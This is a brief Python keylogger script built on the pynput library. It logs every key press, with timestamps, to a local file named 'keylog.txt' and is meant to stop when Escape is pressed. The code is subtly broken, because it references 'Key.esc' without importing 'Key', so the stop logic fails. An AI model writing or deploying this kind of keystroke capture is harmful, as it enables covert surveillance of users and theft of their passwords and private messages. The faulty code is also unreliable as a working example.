from pynput.keyboard import Listener
import logging

# Setting up the log file where keystrokes will be stored
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s - %(message)s')

# Function to log each key press
def on_press(key):
    try:
        # Logging the key press
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # For special keys (like shift, ctrl, etc.)
        logging.info(f"Special key pressed: {key}")

# Function to stop the listener on a specific key press (for example, escape)
def on_release(key):
    if key == Key.esc:
        return False

# Starting the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

